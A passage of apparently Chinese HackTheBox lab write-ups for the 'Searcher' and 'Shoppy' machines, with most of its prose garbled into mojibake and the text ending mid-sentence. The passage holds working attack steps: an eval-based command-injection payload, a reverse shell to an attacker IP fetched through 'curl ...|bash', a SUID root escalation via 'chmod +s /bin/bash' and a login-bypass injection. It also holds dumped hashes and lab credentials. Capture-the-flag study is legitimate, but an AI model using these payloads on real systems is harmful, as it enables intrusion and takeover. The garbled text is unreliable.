æµè§ˆå™¨è®¿é—®http://searcher.htb/ å¤§è‡´æ„æ€ï¼Œæ˜¯ä¸€ä¸ªé›†æˆäº†å¤šæœç´¢å¼•æ“çš„æœç´¢å¹³å°ã€‚ ç¬¬ä¸€ä¸ªæ¡†ï¼ˆSelect your engineï¼‰æ˜¯ä¸ªä¸‹æ‹‰æ¡†ï¼Œå¯é€‰æ‹©å„ç§æœç´¢å¼•æ“ï¼› ç¬¬äºŒä¸ªæ¡†ï¼ˆWhat do you want to search forï¼‰æ˜¯æƒ³è¦æœç´¢çš„å†…å®¹ï¼› æ­¤å¤„å°è¯•æœç´¢å¼•æ“é€‰æ‹©Appleï¼Œæœç´¢å†…å®¹ä¸º123 ä¸‹é¢çš„é€‰é¡¹Auto redirectï¼Œä¸å‹¾é€‰ï¼Œæœç´¢æ—¶ä¼šè¿”å›å¦‚ä¸‹æ ¼å¼çš„é“¾æ¥ï¼›å‹¾é€‰ï¼Œä¼šé‡å®šå‘åˆ°æŒ‡å®šæœç´¢å¼•æ“ å¦å¤–é¡µé¢åº•éƒ¨ï¼Œå¯çœ‹åˆ°Flaskæ¡†æ¶å’ŒSearchor 2.4.0ï¼Œæ‰€ä»¥åç«¯æ˜¯Python ä¸‰ã€å‘½ä»¤æ³¨å…¥æœç´¢çš„åŒæ—¶ç”¨BurpæŠ“åŒ…ï¼Œæµ‹è¯•å‘ç°queryå­—æ®µå¯èƒ½æœ‰æ³¨å…¥ï¼Œå¦‚ä¸‹ä¸¤å¼ å›¾ã€‚Sqlmapå°è¯•postæ³¨å…¥ï¼Œæ— æœ çœ‹äº†ä¸€ä¸‹Githubä¸ŠSearchorçš„ä»‹ç»ï¼šhttps://github.com/ArjunSharda/Searchor æ ¹æ®CLIï¼ˆCommand-Line Interfaceï¼‰å‘½ä»¤ï¼Œæ¨æµ‹ä¸€ä¸‹ï¼Œpostå‚æ•°ä¼ åˆ°CLIæ—¶ï¼Œæ‹¼æ¥å¤§æ¦‚å¦‚ä¸‹ï¼ˆæ­¤å¤„ç”¨123'å’Œ123\"æµ‹è¯•ï¼ŒåŒå¼•å·æ—¶å“åº”æ­£å¸¸ï¼Œå•å¼•å·å“åº”å¼‚å¸¸ï¼Œæ‰€ä»¥å‚æ•°å€¼åº”è¯¥è¢«å•å¼•å·åŒ…è£¹ï¼‰ searchor engine 'query' --copy ä¾‹ï¼šsearchor Apple '123' --copy æƒ³åŠæ³•åœ¨queryå‚æ•°ä½æ³¨å…¥æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ å‚è€ƒï¼šhttps://realpython.com/python-eval-function/ compile()å‡½æ•°è¯­æ³•ï¼š compile() ç”¨äºå°†æºä»£ç ç¼–è¯‘ä¸ºä»£ç å¯¹è±¡æˆ–ASTæ¨¡å—å¯¹è±¡ã€‚å¯ä»¥æ ¹æ®æä¾›çš„æ¨¡å¼ä½¿ç”¨exec()æˆ–eval()å‡½æ•°æ‰§è¡Œè¿”å›çš„ä»£ç å¯¹è±¡ï¼Œä»¥æ„é€ ä»£ç å¯¹è±¡ã€‚ è¯­æ³•ï¼šcompile(source, filename, mode, flags=0, dont_inherit=False, optimize=-1) source: å¿…é€‰é¡¹ï¼Œè¡¨ç¤ºè¦ç¼–è¯‘çš„æºä»£ç ï¼Œå¯ä»¥æ˜¯å­—ç¬¦ä¸²ã€æ–‡ä»¶æˆ–ASTï¼ˆAbstract Syntax Treeï¼‰å¯¹è±¡ã€‚ filename: å¯é€‰é¡¹ï¼Œè¡¨ç¤ºç¼–è¯‘ä»£ç çš„æ–‡ä»¶åï¼Œå¦‚æœä¸æ˜¯ä»æ–‡ä»¶ä¸­ç¼–è¯‘ä»£ç ï¼Œä¼ å…¥ â€œ&lt;string&gt;â€ å³å¯ã€‚ mode: å¯é€‰é¡¹ï¼Œè¡¨ç¤ºç¼–è¯‘ä»£ç ç±»å‹ï¼Œå¯ä»¥å–å€¼ä¸º â€œexecâ€ï¼ˆç¼–è¯‘æ•´ä¸ªä»£ç ï¼‰ï¼Œâ€œevalâ€ï¼ˆç¼–è¯‘å•ä¸ªè¡¨è¾¾å¼ï¼‰æˆ–â€œsingleâ€ï¼ˆç¼–è¯‘å•ä¸ªè¯­å¥ï¼‰ã€‚ flags: å¯é€‰é¡¹ï¼Œä¼ å…¥å˜é‡æˆ–ä½æ©ç ï¼Œç”¨äºæ§åˆ¶ç¼–è¯‘å™¨çš„è¡Œä¸ºæˆ–ç‰¹æ€§ã€‚ dont_inherit: å¯é€‰é¡¹ï¼Œè¡¨ç¤ºæ˜¯å¦ç»§æ‰¿sys.flagså’Œsys.__optimizations__æ¨¡å—ä¸­ç›¸å…³é€‰é¡¹çš„å€¼ã€‚ optimize: å¯é€‰é¡¹ï¼ŒæŒ‡å®šç¼–è¯‘å™¨çš„ä¼˜åŒ–çº§åˆ«ï¼Œè‹¥è®¾ç½®ä¸º-1ï¼Œè¡¨ç¤ºä½¿ç”¨é»˜è®¤ä¼˜åŒ–çº§åˆ«ã€‚ è‡ªå·±æœ¬åœ°ç”¨pythonæµ‹è¯•ä¸€ä¸‹ï¼Œå¦‚ä¸‹ test = compile(\"import os\\nos.system('id')\",\"&lt;String&gt;\",\"exec\") eval(test) å¦‚å›¾å¯ä»¥æˆåŠŸæ‰§è¡Œidå‘½ä»¤ é‚£å°±å°è¯•ä¿®æ”¹è¯·æ±‚åŒ…ï¼Œä¼ é€’å¦‚ä¸‹queryå€¼ï¼Œæ‰§è¡Œidå‘½ä»¤ï¼ˆå‰é¢1'å’Œåé¢'ç”¨äºé—­åˆï¼Œä¸­é—´æœ‰ç©ºæ ¼çš„åœ°æ–¹ç”¨åŠ å·è¿æ¥ã€‚å®é™…æµ‹è¯•æœ‰æ²¡æœ‰åŠ å·éƒ½å¯ä»¥ï¼Œä½†å‰åä¸¤ä¸ª%2béœ€è¦åŠ ï¼Œä¸”ç”¨ç©ºæ ¼å’Œ%20æ›¿ä»£è¡Œä¸é€šï¼‰ query=1'%2beval(compile(\"import+os\\nos.system('id')\",'&lt;String&gt;','exec'))%2b' ä¼ åˆ°CLIåï¼š searchor Apple '1' eval(compile(\"import os\\nos.system('id')\",'&lt;String&gt;','exec')) '' --copy å¯çœ‹åˆ°æœ‰ä¸‰ä¸ªåœ°æ–¹å±•ç¤ºäº†å›æ˜¾ï¼šå“åº”å¤´éƒ¨Locationã€å“åº”å†…å®¹&lt;a&gt;æ ‡ç­¾hrefå€¼ã€å“åº”å†…å®¹&lt;a&gt;æ ‡ç­¾æ–‡æœ¬ã€‚ä¸”å½“å‰ç”¨æˆ·æ˜¯svc å†ç”¨å¦‚ä¸‹è¯­å¥æ‰§è¡Œlså‘½ä»¤æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹å†…å®¹ query=1'%2beval(compile(\"import+os\\nos.system('ls')\",'&lt;String&gt;','exec'))%2b' æœ‰app.pyå’Œtemplates ç„¶åæ‰§è¡Œcat app.pyå‘½ä»¤æŸ¥çœ‹app.pyå†…å®¹ query=1'%2beval(compile(\"import+os\\nos.system('cat+app.py')\",'&lt;String&gt;','exec'))%2b' URLè§£ç å¾—å¦‚ä¸‹ä»£ç ï¼Œä»ä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°postä¼ å‚çš„é€»è¾‘ from flask import Flask, render_template, request, redirect from searchor import Engine import subprocess app = Flask(__name__) @app.route('/') def index(): return render_template('index.html', options=Engine.__members__, error='') @app.route('/search', methods=['POST']) def search(): try: engine = request.form.get('engine') query = request.form.get('query') auto_redirect = request.form.get('auto_redirect') if engine in Engine.__members__.keys(): arg_list = ['searchor', 'search', engine, query] r = subprocess.run(arg_list, capture_output=True) url = r.stdout.strip().decode() if auto_redirect is not None: return redirect(url, code=302) else: return url else: return render_template('index.html', options=Engine.__members__, error=\"Invalid engine!\") except Exception as e: print(e) return render_template('index.html', options=Engine.__members__, error=\"Something went wrong!\") if __name__ == '__main__': app.run(debug=False) æ¥ä¸‹æ¥å°è¯•åå¼¹shell æ”»å‡»æœºå¼€å¯ncç›‘å¬å’ŒhttpæœåŠ¡ nc -lvnp 9898 python3 -m http.server 80 æ”»å‡»æœºæ–°å»ºä¸€ä¸ªåå¼¹shellæ–‡ä»¶rev_shell.txtï¼Œå†…å®¹å¦‚ä¸‹ bash -i &gt;&amp; /dev/tcp/10.10.14.7/9898 0&gt;&amp;1 Burpä¿®æ”¹è¯·æ±‚åŒ…queryå‚æ•°å¦‚ä¸‹ query=1'%2beval(compile(\"import+os\\nos.system('curl+10.10.14.7/rev_shell.txt|bash')\",'&lt;String&gt;','exec'))%2b' å‘é€è¯·æ±‚åŒ…ï¼ŒæˆåŠŸåå¼¹shellï¼Œè·å–svcç”¨æˆ·æƒé™ å››ã€Gitä¿¡æ¯æ³„éœ²æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ–‡ä»¶ï¼Œçœ‹åˆ°æœ‰.gitï¼Œå°è¯•git-dumpå’ŒGithackä¸‹è½½å¤±è´¥ï¼Œåªèƒ½ç¡¬çœ‹ çœ‹åˆ°configæ–‡ä»¶é‡Œæœ‰ç”¨æˆ·åå¯†ç  cody:jh1usoih2bkjaspwe92 PSï¼šåé¢çš„gitea.searcher.htbæ˜¯ä¸ªå­åŸŸï¼ŒåŠ è¿›hostsæ–‡ä»¶çœ‹äº†ä¸€çœ¼ï¼Œæ˜¯ä¸ªç±»ä¼¼gitä»“åº“çš„ä¸œè¥¿ï¼Œæœ‰ä¸¤ä¸ªç”¨æˆ·codyå’Œadministratorï¼Œä¼°è®¡ä¹Ÿæ˜¯ä¸€æ¡è·¯çº¿ï¼Œä½†æ²¡è¿‡å¤šå°è¯• äº”ã€SUIDææƒåœ¨svcç”¨æˆ·å°è¯•æ‰§è¡Œsudo -lï¼Œå‘ç°æç¤ºéœ€è¦-Så‚æ•°è¾“å…¥å¯†ç  æ‰§è¡Œsudo -l -Sï¼Œå°è¯•å¯†ç ï¼Œæ˜¯ä¸Šé¢codyçš„å¯†ç ï¼ˆPSï¼šåœ¨HackTheBoxé‡è§å¥½å‡ æ¬¡è¿™ç§å¼ å† ææˆ´çš„äº‹â€¦ï¼‰ å¯çœ‹åˆ°æœ‰ä¸€æ¡å‘½ä»¤å¯ä»¥ä»¥rootèº«ä»½æ‰§è¡Œï¼Œsudoæ‰§è¡Œè¯¥å‘½ä»¤ sudo /usr/bin/python3 /opt/scripts/system-checkup.py * æç¤ºä¸‰ä¸ªç”¨æ³•ï¼Œå‰ä¸¤ä¸ªæ˜¯æŸ¥çœ‹dockerå®¹å™¨çš„ç›¸å…³ä¿¡æ¯ï¼Œç”¨å¤„ä¸å¤§ï¼Œç¬¬ä¸‰ä¸ªå°è¯•ä¼šæŠ¥é”™ï¼Œå¦‚ä¸‹ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup æƒ³çœ‹ä¸€ä¸‹/opt/scripts/system-checkup.pyï¼Œæ²¡æƒé™ï¼Œå°±ç”¨findå‘½ä»¤æ¨¡ç³ŠæŸ¥æ‰¾full-checkupï¼Œå‘ç°æœ‰/opt/scripts/full-checkup.shï¼Œä½†svcç”¨æˆ·æ²¡æœ‰å¯å†™æƒé™æ²¡æ³•æ›´æ”¹ï¼Œé‚£å°±å°è¯•åœ¨å½“å‰ç›®å½•/home/svcæ–°å»ºä¸€ä¸ªåŒåæ–‡ä»¶ é¶æœºshellç¯å¢ƒä¸æ–¹ä¾¿ç¼–è¾‘æ–‡ä»¶ï¼Œæˆ‘ä»¬åœ¨æ”»å‡»æœºåˆ›å»ºfull-checkup.shï¼Œå†…å®¹å¦‚ä¸‹ #!/bin/bash chmod +s /bin/bash ç„¶ååœ¨é¶æœºç”¨wgetæŠŠfull-checkup.shä¼ è¿‡æ¥ï¼Œå¹¶æ·»åŠ å¯æ‰§è¡Œæƒé™ï¼ˆæ³¨æ„éœ€åœ¨/home/svcç›®å½•ä¸‹æ“ä½œï¼Œåˆ«çš„ç›®å½•æ— å¯å†™æƒé™ï¼‰ wget http://10.10.14.7/full-checkup.sh chmod +x full-checkup.sh å†æ¬¡æ‰§è¡Œfull-checkupé€‰é¡¹ï¼Œå¯çœ‹åˆ°/bin/bashå·²æˆåŠŸè®¾ç½®suid æ‰§è¡Œbash -pæˆåŠŸè·å–rootæƒé™ Overï¼ å‚è€ƒhttps://blog.csdn.net/qq_58869808/article/details/130050438","categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Shoppy","slug":"HTB6-Shoppy","date":"2023-04-12T12:47:00.000Z","updated":"2023-08-31T07:58:00.775Z","comments":true,"path":"posts/9681db2a.html","link":"","permalink":"https://wa0er.github.io/posts/9681db2a.html","excerpt":"","text":"HTB-Shoppyä¸€ã€æ€è·¯æ¦‚è¦ ä¿¡æ¯æ”¶é›†ç›®å½•æšä¸¾å¾—åˆ°/loginé¡µé¢ï¼› ä¸‡èƒ½å¯†ç ç™»å½•/loginé¡µé¢ï¼› å†æ¬¡ä¸‡èƒ½å¯†ç æ‹¿åˆ°joshè´¦æˆ·ï¼ˆésshè´¦æˆ·ï¼‰ï¼› æšä¸¾å­åŸŸå¾—åˆ°mattermostå­åŸŸï¼› joshè´¦æˆ·ç™»å½•mattermostå­åŸŸå¹¶åˆ†æé¡µé¢æ‹¿åˆ°sshè´¦æˆ·ï¼› è¿ä¸Šsshè´¦æˆ·sudo -lå‘ç°å¯æ‰§è¡Œæ–‡ä»¶ï¼› é€†å‘åˆ†æå¯æ‰§è¡Œæ–‡ä»¶æ‹¿åˆ°deployè´¦æˆ·ï¼› dockerææƒè·å–rootæƒé™ã€‚ äºŒã€ä¿¡æ¯æ”¶é›†nmapï¼ˆç”¨å¦‚ä¸‹ä¸¤æ­¥ï¼Œå…ˆæ‰«å…¨ç«¯å£ï¼Œå†æŒ‡å®šç«¯å£å®šå‘æ‰«ææœåŠ¡ã€ç‰ˆæœ¬ç›¸å…³ä¿¡æ¯ï¼Œæœ‰åŠ©äºæå‡æ‰«æé€Ÿåº¦ï¼‰ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -p- --min-rate 10000 10.129.92.247 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-31 04:15 EDT Nmap scan report for 10.129.92.247 Host is up (0.33s latency). Not shown: 65532 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9093/tcp open copycat Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nmap -p 22,80,9093 -sCV 10.129.92.247 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-31 04:24 EDT Nmap scan report for 10.129.92.247 Host is up (0.32s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA) | 256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA) |_ 256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519) 80/tcp open http nginx 1.23.1 |_http-server-header: nginx/1.23.1 |_http-title: Did not follow redirect to http://shoppy.htb 9093/tcp open copycat? | fingerprint-strings: | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Fri, 31 Mar 2023 08:24:50 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 15 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 15 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=\"0\"} 2.8824e-05 | go_gc_duration_seconds{quantile=\"0.25\"} 7.6212e-05 | go_gc_d | HTTPOptions: | HTTP/1.0 200 OK | Content-Type: text/plain; version=0.0.4; charset=utf-8 | Date: Fri, 31 Mar 2023 08:24:51 GMT | HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime. | TYPE go_gc_cycles_automatic_gc_cycles_total counter | go_gc_cycles_automatic_gc_cycles_total 15 | HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application. | TYPE go_gc_cycles_forced_gc_cycles_total counter | go_gc_cycles_forced_gc_cycles_total 0 | HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles. | TYPE go_gc_cycles_total_gc_cycles_total counter | go_gc_cycles_total_gc_cycles_total 15 | HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles. | TYPE go_gc_duration_seconds summary | go_gc_duration_seconds{quantile=\"0\"} 2.8824e-05 | go_gc_duration_seconds{quantile=\"0.25\"} 7.6212e-05 |_ go_gc_d 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port9093-TCP:V=7.91%I=7%D=3/31%Time=642698D4%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20t SF:ext/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x SF:20Request\")%r(GetRequest,152D,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\ SF:x20text/plain;\\x20version=0\\.0\\.4;\\x20charset=utf-8\\r\\nDate:\\x20Fri,\\x2 SF:031\\x20Mar\\x202023\\x2008:24:50\\x20GMT\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_ SF:automatic_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\x SF:20generated\\x20by\\x20the\\x20Go\\x20runtime\\.\\n#\\x20TYPE\\x20go_gc_cycles_ SF:automatic_gc_cycles_total\\x20counter\\ngo_gc_cycles_automatic_gc_cycles_ SF:total\\x2015\\n#\\x20HELP\\x20go_gc_cycles_forced_gc_cycles_total\\x20Count\\ SF:x20of\\x20completed\\x20GC\\x20cycles\\x20forced\\x20by\\x20the\\x20applicatio SF:n\\.\\n#\\x20TYPE\\x20go_gc_cycles_forced_gc_cycles_total\\x20counter\\ngo_gc SF:_cycles_forced_gc_cycles_total\\x200\\n#\\x20HELP\\x20go_gc_cycles_total_gc SF:_cycles_total\\x20Count\\x20of\\x20all\\x20completed\\x20GC\\x20cycles\\.\\n#\\x SF:20TYPE\\x20go_gc_cycles_total_gc_cycles_total\\x20counter\\ngo_gc_cycles_t SF:otal_gc_cycles_total\\x2015\\n#\\x20HELP\\x20go_gc_duration_seconds\\x20A\\x2 SF:0summary\\x20of\\x20the\\x20pause\\x20duration\\x20of\\x20garbage\\x20collecti SF:on\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_duration_seconds\\x20summary\\ngo_gc_d SF:uration_seconds{quantile=\\\"0\\\"}\\x202\\.8824e-05\\ngo_gc_duration_seconds{ SF:quantile=\\\"0\\.25\\\"}\\x207\\.6212e-05\\ngo_gc_d\")%r(HTTPOptions,1A5A,\"HTTP/ SF:1\\.0\\x20200\\x20OK\\r\\nContent-Type:\\x20text/plain;\\x20version=0\\.0\\.4;\\x SF:20charset=utf-8\\r\\nDate:\\x20Fri,\\x2031\\x20Mar\\x202023\\x2008:24:51\\x20GM SF:T\\r\\n\\r\\n#\\x20HELP\\x20go_gc_cycles_automatic_gc_cycles_total\\x20Count\\x SF:20of\\x20completed\\x20GC\\x20cycles\\x20generated\\x20by\\x20the\\x20Go\\x20ru SF:ntime\\.\\n#\\x20TYPE\\x20go_gc_cycles_automatic_gc_cycles_total\\x20counter SF:\\ngo_gc_cycles_automatic_gc_cycles_total\\x2015\\n#\\x20HELP\\x20go_gc_cycl SF:es_forced_gc_cycles_total\\x20Count\\x20of\\x20completed\\x20GC\\x20cycles\\x SF:20forced\\x20by\\x20the\\x20application\\.\\n#\\x20TYPE\\x20go_gc_cycles_force SF:d_gc_cycles_total\\x20counter\\ngo_gc_cycles_forced_gc_cycles_total\\x200\\ SF:n#\\x20HELP\\x20go_gc_cycles_total_gc_cycles_total\\x20Count\\x20of\\x20all\\ SF:x20completed\\x20GC\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_cycles_total_gc_cycl SF:es_total\\x20counter\\ngo_gc_cycles_total_gc_cycles_total\\x2015\\n#\\x20HEL SF:P\\x20go_gc_duration_seconds\\x20A\\x20summary\\x20of\\x20the\\x20pause\\x20du SF:ration\\x20of\\x20garbage\\x20collection\\x20cycles\\.\\n#\\x20TYPE\\x20go_gc_d SF:uration_seconds\\x20summary\\ngo_gc_duration_seconds{quantile=\\\"0\\\"}\\x202 SF:\\.8824e-05\\ngo_gc_duration_seconds{quantile=\\\"0\\.25\\\"}\\x207\\.6212e-05\\n SF:go_gc_d\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 122.77 seconds å¼€æ”¾ç«¯å£ï¼š22ï¼ˆsshï¼‰ã€80ï¼ˆhttpï¼‰ã€9093ï¼ˆcopycatï¼‰ï¼Œè·å¾—åŸŸåshoppy.htb å°†åŸŸåæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶ echo \"10.129.92.247 shoppy.htb\" &gt;&gt; /etc/hosts æµè§ˆå™¨æ‰“å¼€shoppy.htb æšä¸¾å­ç›®å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 100 -mc 200,302,301 -u http://shoppy.htb/FUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://shoppy.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,302,301 ________________________________________________ [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 413ms] * FUZZ: admin [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 414ms] * FUZZ: images [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 417ms] * FUZZ: js [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 435ms] * FUZZ: assets [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 441ms] * FUZZ: css [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 468ms] * FUZZ: login [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 323ms] * FUZZ: Admin [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 429ms] * FUZZ: Login [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 335ms] * FUZZ: fonts [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 327ms] * FUZZ: ADMIN [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 332ms] * FUZZ: exports [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 376ms] * FUZZ: [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 330ms] * FUZZ: LOGIN :: Progress: [20116/20116] :: Job [1/1] :: 282 req/sec :: Duration: [0:01:06] :: Errors: 0 :: æšä¸¾åˆ°çš„ç›®å½•ï¼Œ301çš„é¡µé¢éƒ½æ²¡ä¸œè¥¿ï¼Œ302çš„éƒ½é‡å®šå‘åˆ°/loginç›®å½• ä¸‰ã€ä¸‡èƒ½å¯†ç è®¿é—®shoppy.htb/login ç”¨æˆ·åè¾“å…¥å¦‚ä¸‹ï¼Œå¯†ç ä»»æ„ï¼ˆä¸‡èƒ½å¯†ç ï¼‰ï¼ŒæˆåŠŸç™»å½• admin'||'1==1 ç‚¹å‡»é¡µé¢å³ä¸Šè§’æœç´¢æ ‡ç­¾ï¼Œå†æ¬¡è¾“å…¥ä¸‡èƒ½å¯†ç ï¼Œå¼¹å‡ºå¦‚ä¸‹Download exportæ ‡ç­¾ ç‚¹å‡»Download exportæ ‡ç­¾ï¼Œå¾—åˆ°ä¸¤ç»„è´¦æˆ·ï¼Œadminå’Œjosh [{ \"_id\": \"62db0e93d6d6a999a66ee67a\", \"username\": \"admin\", \"password\": \"23c6877d9e2b564ef8b32c3a23de27b2\" }, { \"_id\": \"62db0e93d6d6a999a66ee67b\", \"username\": \"josh\", \"password\": \"6ebcea65320589ca4f2f1ce039975995\" }] ç ´è§£hashï¼šhttps://crackstation.net/ josh remembermethisway ç”¨è¯¥è´¦æˆ·ç™»å½•sshï¼Œä¸å¯¹ é‚ç”¨wfuzzæšä¸¾å­åŸŸåï¼Œå‘ç°å¾ˆå¤š301 â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# wfuzz -u http://10.129.92.247 -H \"Host: FUZZ.shoppy.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.129.92.247/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 301 7 L 11 W 169 Ch \"www\" 000000020: 301 7 L 11 W 169 Ch \"www2\" 000000019: 301 7 L 11 W 169 Ch \"dev\" 000000015: 301 7 L 11 W 169 Ch \"ns\" 000000003: 301 7 L 11 W 169 Ch \"ftp\" 000000021: 301 7 L 11 W 169 Ch \"ns3\" 000000022: 301 7 L 11 W 169 Ch \"pop3\" 000000018: 301 7 L 11 W 169 Ch \"blog\" ...... å†ç”¨ffufæé€Ÿæšä¸¾å­åŸŸåï¼ˆwfuzzè¿™ä¸ªé€Ÿåº¦æœ‰ç‚¹çª’æ¯ï¼Œç”¨ffufæˆ–gobusteræé€Ÿï¼‰ï¼Œå¹¶ä¸”æ¢ä¸ªå¤§å­—å…¸ï¼Œè¿‡æ»¤301å“åº” â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.129.92.247 -H \"Host: FUZZ.shoppy.htb\" -fc 301 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.129.92.247 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.shoppy.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response status: 301 ________________________________________________ [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 318ms] * FUZZ: mattermost :: Progress: [100000/100000] :: Job [1/1] :: 100 req/sec :: Duration: [0:13:49] :: Errors: 0 :: å‘ç°mattermostå­åŸŸåï¼Œæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶ echo \"10.129.92.247 mattermost.shoppy.htb\" &gt;&gt; /etc/hosts è®¿é—®mattermost.shoppy.htb ç”¨åˆšåˆšçš„joshè´¦æˆ·ç™»å½•ï¼Œåœ¨å·¦ä¾§Deploy Machineæ ï¼ŒèŠå¤©è®°å½•é‡Œå‘ç°jaegerè´¦æˆ· username: jaeger password: Sh0ppyBest@pp! sshè¿ä¸Šï¼ˆIPæœ‰å˜åŒ–æ˜¯å› ä¸ºé‡å¯äº†é¶æœºç¯å¢ƒï¼‰ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh jaeger@10.129.93.16 jaeger@10.129.93.16's password: Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. jaeger@shoppy:~$ id uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger) jaeger@shoppy:~$ pwd /home/jaeger ç”¨sudo -læŸ¥çœ‹æ­¤ç”¨æˆ·æƒé™ jaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands 